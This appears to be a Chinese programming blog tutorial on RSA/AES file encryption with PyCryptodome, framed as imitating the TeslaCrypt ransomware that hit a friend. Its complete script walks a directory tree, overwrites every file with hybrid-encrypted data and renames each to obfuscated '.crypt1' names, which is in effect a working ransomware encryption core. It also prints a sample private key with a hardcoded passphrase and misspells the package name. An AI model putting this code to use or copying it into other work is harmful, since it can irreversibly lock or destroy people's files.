---
title: Python RSA文件加密
date: 2016-11-20 21:51:47
categories:
- Python进阶
tags:
- 文件加密
- RSA
---

本文教你如何用Python对文件进行不对称加密。

<!-- more -->

# 一、引言

前段时间，一个同学找到我说他的电脑中病毒了，电脑上所有重要的文件都变成了***.cryp1，打也打不开，大学生涯的重要文件都没有了，很着急所以让我帮忙看看。嗯，作为程序员的觉悟，第一反应就是开始找资料，看看这个是什么鬼。

Google了一番后，发现这个病毒的名字叫特斯拉勒索者，会把你电脑上的一些文件进行加密，变成***.cryp1，并留下一个比特币支付的链接，让你打钱过去，不打钱就不给你解密的方法，那么如果你中毒了，那么只能恭喜你了！因为除了作者把私钥放出来，否则基本上没有破解的可能。

为什么这么说呢？病毒会对文件进行不对称加密，也就是公钥加密算法。只要保证你的密钥长度足够长，那么基本上就没有破解的可能。为什么这么说呢？你可以想象一下银行卡交易被破解的后果。

# 二、RSA简介

RSA公钥加密算法是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。RSA就是他们三人姓氏开头字母拼在一起组成的。
RSA是目前最有影响力的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，RSA算法基于一个十分简单的数论事实：将两个大质数相乘十分容易，但是想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。

RSA算法的原理，目前网络上有许多优秀的文章，特别推荐阅读阮一峰老师的文章：

- [RSA算法原理1](http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html)
- [RSA算法原理2](http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html)

本文主要描述如何使用RSA来对文件进行不对成加密。

# 三、PyCrypto

PyCrypto是Python中密码学方面比较有名的第三方软件包。可惜的是，它的开发工作于 2012 年就已停止。幸运的是，有一个该项目的分支 PyCrytodome 取代了PyCrypto，可以支持Python3.5，在Windows上，我们可以直接安装：

```python
py -3 -m pip install PyCrytodome
```

相关文档可以直接访问：
- [例子说明](http://pycryptodome.readthedocs.io/en/latest/src/examples.html)
- [API说明](http://legrandin.github.io/pycryptodome/Doc/3.4/)

# 四、文件加密

准备好环境之后，那么我们现在来开始模拟`黑客`对文件进行加密处理吧！！
如果前面有了解RSA算法的话，那么肯定知道，我们第一步就是要生成公钥和私钥，用公钥对文件进行加密，用私钥对文件进行解密。

## 4.1 生成公钥和私钥

在这个例子中，我们将生成自己的密钥对。创建 RSA 密钥非常容易：

```python
from Crypto.PublicKey import RSA

def CreateRSAKeys():
    code = 'nooneknows'
    # 生成 2048 位的 RSA 密钥
    key = RSA.generate(2048)
    encrypted_key = key.exportKey(passphrase=code, pkcs=8, protection="scryptAndAES128-CBC")
    # 生成私钥
    with open('my_private_rsa_key.bin', 'wb') as f:
        f.write(encrypted_key)
    # 生成公钥
    with open('my_rsa_public.pem', 'wb') as f:
        f.write(key.publickey().exportKey())
```

当我们执行CreateRSAKeys()后，会在当前目录生成公钥和私钥，我们打开看看。

公钥：
```
-----BEGIN RSA PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzVRRmo7R3VPtsUz/uBBi
/Ofb/5NKMoylH6xnFfH3WaN8oTj9706xxrNmuJ0kc4QVNDofKKogfotjVRDbe6FT
7JoH9NclCNEvfiaOWnwXV6srPYBfQb7pCl4cfQ23U/EOFR2SRAIO9yYy5z8vToG3
shSPKcs3dXGfnzYaJcvCwcG8Dmk09S2wLTdo7ZqPp5erG5eYa2ohV0B94SQyHvUk
Bl5iYlkH0zUdnif7u47xziAM2HtWB2xMB7l3ckaltuN6qPvXkyaz50HUTbZRhVFn
iHd5iaseAYxD74uLw5TYmj8s5A33lPO4oJe868ukgUl0DMSF48OX2OO4TrhYZEFJ
BwIDAQAB
-----END RSA PUBLIC KEY-----
```

私钥：
```
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFJTBPBgkqhkiG9w0BBQ0wQjAhBgkrBgEEAdpHBAswFAQI2zONWIfQCF4CAkAA
AgEIAgEBMB0GCWCGSAFlAwQBAgQQLRSUFPMMc6Zds4C/tu2lKwSCBNDtbdkpf3un
1hQz8nJ0x91m6FH3esDz+IGSjVBMFAT0uy5TiKv/2u3glj+sgFEM7aLOeaX3Qouk
kEm5L73J28qEeZ3hqNoaMmYdzAaHuCOjHubXaii3AoKTg4PXO9Qy4v/IICTj5CQq
SMSSFXlkSmfz7u4WzwQzM1LOwSwLuHVJElVCxiOBA7m4dJgNNd6iRIPyTLh2ECiK
wrMgkaGbQIxYN7RMt9tm2cL5z6Ah8sRBjlDbM1QSnOEyY9NPrWqHyT/R1enjLkQp
DiZUtxp5A9yjE1QEiKBvqIKTMDhGcXK1S7KXo7DWYOMpU1zZp0dLWKFmyNmi6b9H
tu/HYFcV6pDDA3x+yVnDZsxcDJ/iaJJ7v6qFI04dukVbkr977PHTaUj9AbmQZf/K
hnBr2BmL65h84oPhnxVk50g//DAiorPUZ5BEFNdOExlW/eiUezG+n86vtqd3VFYZ
/LMlse6C+fLiwHRTbbJx2jRiIbpcBOdUcqLxdjUsFiUtuwZeh9A/9Zu3GJjd0kp2
Itp1I9wrI9l56msSfO6n5//11Jjtc1ANxcJY9np1julboEyhS5H25PojXL7moUy5
yWbzPe9I9xodLJGIpa0FqmEM2O0AuV4CCO3QzbVMc3fOY264wxHnIMhMhQocD9dy
R1TNtfb3A5Hsj3nLVcFgpUj9WdrHfmxPAgcY2LCSxVhrKaitjUMDi3ea5G5G6DeZ
f5/+Vc0M4gxyeyn7fp5DY6AEdNea2P+4UPsXdUw74jExHiYv0Zx07kGjM9Qwvg9f
GUhDJvMtxuFGjBqy4wnYwGx3PvHPljONPhxpE2naXlhjsi0K39Q6P+o+bTYOBZBl
icdup4feaZ9AtcN8fU3kFKPnkbQ9fLwTGA8UuJAguBW95jJ5trT8tmn4o0y3O61f
nGyN3JyzwaI/fPi8QavqUti3cSTxcYDr9oXBU1ND9YLB8LKgnXE9LD3kg0a6w6kE
dJPpf9OTeMFb85wf/bEviof0CgK/fGcz9DxuRvJLRLPwTfXXh3stZ33Rky/MuX1h
5qmd7eDXEZmFWvi73P5R61+xGHxgarP9Ww7bX6EcC7HN9xg2QcWHDusdWaw/HE9J
1pHxCzOQoxE4SclqEtTo3J9fXhQgKfKih7azWP1PpTsjvZ/J4ZwZeGWUDXzk54op
Dg8PFEhAPsyRt94iKP+oKb3zHYpkcuU4UAk8+fPznZ+1hIvboryn3CfV6t29dyGE
9R3VCCPLBrpy4DJhvuITjlZdeh6fhUV4SOXjUBEhNn+6wv3L3U3INvXIwfJssAf+
boXk4lf209HcGz05Q6dFyN106q7UjWK/e+ometiD/wL51DoRBnS5CfrW9U1o4m4P
I23mKeoaf0i7SoPz2vVF7w7vEzXXgk7wO4bN0AqeFjCMFw/hOQqZrNHcIWchsmiP
wCqwj/FSGHIzGvppbTPr8qudMlXmaL1xGbyJAOAJW+qVaEwzJx7wvrchehGwzYbI
YuGuWfYqKIh4+1VgQyafDuO13o5TeqdZa3ghgWiRpJse7KabbVgHLyBfxMvVuIpH
qpM3qaTqsp4CICPuCFVoB5HReu0V7l1gfN++Tjo5BLV5rijyhWjnlUDRXqntnXqA
2RC9vOpNMZ6L8Fp6VvA9i3ZI9RvkkeI2rw==
-----END ENCRYPTED PRIVATE KEY-----
```

当然每次运行的结果都不一定，公钥是公开的，任何人都可以看到，但是私钥一定要保存好，否则一旦泄露，意味着你的信息也不安全了。

## 4.2 利用公钥对文件进行加密

现在我们来看看如何对文件进行加密处理：

```python
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes

def Encrypt(filename):         
    data = ''
    # 二进制只读打开文件，读取文件数据
    with open(filename, 'rb') as f:
        data = f.read()

    with open(filename, 'wb') as out_file:
        # 收件人秘钥 - 公钥
        recipient_key = RSA.import_key(open('my_rsa_public.pem').read())
        #一个 16 字节的会话密钥
        session_key = get_random_bytes(16)

        # Encrypt the session key with the public RSA key
        cipher_rsa = PKCS1_OAEP.new(recipient_key)
        out_file.write(cipher_rsa.encrypt(session_key))

        # Encrypt the data with the AES session key
        cipher_aes = AES.new(session_key, AES.MODE_EAX)
       
        ciphertext, tag = cipher_aes.encrypt_and_digest(data)

        out_file.write(cipher_aes.nonce)
        out_file.write(tag)
        out_file.write(ciphertext)
```

我们打开一个文件用于写入数据。接着我们导入公钥赋给一个变量，创建一个 16 字节的会话密钥。在这个例子中，我们将使用混合加密方法，即 PKCS#1 OAEP ，也就是最优非对称加密填充。这允许我们向文件中写入任意长度的数据。接着我们创建 AES 加密，要加密的数据，然后加密数据。我们将得到加密的文本和消息认证码。最后，我们将随机数，消息认证码和加密的文本写入文件。

加密后，这个时候你肯定没有办法按照原来的方式打开你的文件了，或者你能打开，显示的也是乱码。

## 4.3 利用私钥对文件进行解密

现在让我们学习如何解密我们的文件数据：

```python
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP

def Descrypt(filename):
    code = 'nooneknows'
    with open(filename, 'rb') as fobj:
        # 导入私钥
        private_key = RSA.import_key(open('my_private_rsa_key.bin').read(), passphrase=code)
        # 会话密钥， 随机数，消息认证码，机密的数据
        enc_session_key, nonce, tag, ciphertext = [ fobj.read(x) 
                                                    for x in (private_key.size_in_bytes(), 
                                                    16, 16, -1) ]
        cipher_rsa = PKCS1_OAEP.new(private_key)
        session_key = cipher_rsa.decrypt(enc_session_key)
        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
        # 解密
        data = cipher_aes.decrypt_and_verify(ciphertext, tag)
    
    with open(filename, 'wb') as wobj:
        wobj.write(data) 

```

我们先以二进制模式读取我们的加密文件，然后导入私钥。注意，当你导私钥时，需要提供一个密码，否则会出现错误。然后，我们文件中读取数据，首先是加密的会话密钥，然后是 16 字节的随机数和 16 字节的消息认证码，最后是剩下的加密的数据。

接下来我们需要解密出会话密钥，重新创建 AES 密钥，然后解密出数据。

解密完成后，我们会发现刚刚打不开或者无法正确显示的文件，又恢复正常了！

# 五、文件名处理

当然至此，文件加密的部分已经完成，但是为了使这个更像病毒，我们可以模拟黑客的做法，直接把整个文件的后缀名改掉，或者更混蛋一点，我就是想搞破坏，直接把文件名字改成一串没有意义的数值：

## 5.1 文件重命名

举例比如：blog2.rar ==> yFmcuIzZvxmY.crypt1

```python
import os
import base64

def RenameFile(dir,filename):
    filename_bytes = filename.encode('utf-8')

    filename_bytes_base64 = base64.encodestring(filename_bytes)    
    filename_bytes_base64 = filename_bytes_base64[::-1][1:]   # 倒序
    
    new_filename = filename_bytes_base64.decode('utf-8') + '.crypt1'
    
    #print (new_filename)
    print(os.path.join(dir, filename))
    print(os.path.join(dir,new_filename))
    os.rename(os.path.join(dir, filename), os.path.join(dir,new_filename))
```

使用了base64对文件名进行编码。

## 5.2 恢复文件名

举例比如: yFmcuIzZvxmY.crypt1 ==> blog2.rar

```python
import os
import base64

def ReserveFilename(dir, filename):
    f = filename
    filename = filename[::-1][7:][::-1]
    filename_base64 = filename[::-1] + '\n'
    filename_bytes_base64 = filename_base64.encode('utf-8')
    ori_filename = base64.decodestring(filename_bytes_base64).decode('utf-8')
    print(os.path.join(dir, f))
    print(os.path.join(dir,ori_filename))
    os.rename(os.path.join(dir, f),os.path.join(dir,ori_filename))
```

使用了base64对文件进行解码。

# 六、完整源码

我们把上述几个过程整合起来，然后实现对某一个目录下的所有文件进行不对称加密和不对称解密：

```python
#coding=utf-8

from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import os
import base64

def CreateRSAKeys():
    code = 'nooneknows'
    key = RSA.generate(2048)
    encrypted_key = key.exportKey(passphrase=code, pkcs=8, protection="scryptAndAES128-CBC")
    # 私钥
    with open('my_private_rsa_key.bin', 'wb') as f:
        f.write(encrypted_key)
    # 公钥
    with open('my_rsa_public.pem', 'wb') as f:
        f.write(key.publickey().exportKey())

def Encrypt(filename):         
    data = ''
    with open(filename, 'rb') as f:
        data = f.read()

    with open(filename, 'wb') as out_file:
        # 收件人秘钥 - 公钥
        recipient_key = RSA.import_key(open('my_rsa_public.pem').read())
        session_key = get_random_bytes(16)

        # Encrypt the session key with the public RSA key
        cipher_rsa = PKCS1_OAEP.new(recipient_key)
        out_file.write(cipher_rsa.encrypt(session_key))

        # Encrypt the data with the AES session key
        cipher_aes = AES.new(session_key, AES.MODE_EAX)
        ciphertext, tag = cipher_aes.encrypt_and_digest(data)

        out_file.write(cipher_aes.nonce)
        out_file.write(tag)
        out_file.write(ciphertext)
        
def Descrypt(filename):
    code = 'nooneknows'
    with open(filename, 'rb') as fobj:
        private_key = RSA.import_key(open('my_private_rsa_key.bin').read(), passphrase=code)
        enc_session_key, nonce, tag, ciphertext = [ fobj.read(x) 
                                                    for x in (private_key.size_in_bytes(), 
                                                    16, 16, -1) ]
        cipher_rsa = PKCS1_OAEP.new(private_key)
        session_key = cipher_rsa.decrypt(enc_session_key)
        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
        data = cipher_aes.decrypt_and_verify(ciphertext, tag)
    
    with open(filename, 'wb') as wobj:
        wobj.write(data) 

def RenameFile(dir,filename):
    filename_bytes = filename.encode('utf-8')
    filename_bytes_base64 = base64.encodestring(filename_bytes)
    
    filename_bytes_base64 = filename_bytes_base64[::-1][1:]
    new_filename = filename_bytes_base64.decode('utf-8') + '.crypt1'

    print(os.path.join(dir, filename))
    print(os.path.join(dir,new_filename))
    os.rename(os.path.join(dir, filename), os.path.join(dir,new_filename))

def ReserveFilename(dir, filename):
    f = filename
    filename = filename[::-1][7:][::-1]
    filename_base64 = filename[::-1] + '\n'
    filename_bytes_base64 = filename_base64.encode('utf-8')

    ori_filename = base64.decodestring(filename_bytes_base64).decode('utf-8')
    print(os.path.join(dir, f))
    print(os.path.join(dir,ori_filename))
    os.rename(os.path.join(dir, f),os.path.join(dir,ori_filename))
    
def Main(rootDir): 
    list_dirs = os.walk(rootDir) 
    for root, dirs, files in list_dirs: 
        # 切换加密和解密过程
        #if False: 
        if True:
            # 遍历文件，加密并且改名
            for f in files: 
                filename = os.path.join(root, f)
                Encrypt(filename)
                RenameFile(root, f)
        else:   
            # 遍历文件，解密并且恢复名字
            for f in files: 
                filename = os.path.join(root, f)
                Descrypt(filename)
                ReserveFilename(root, f)
            

if __name__ == '__main__':
    #CreateRSAKeys()
    d = 'D:\\des'
    Main(d)

```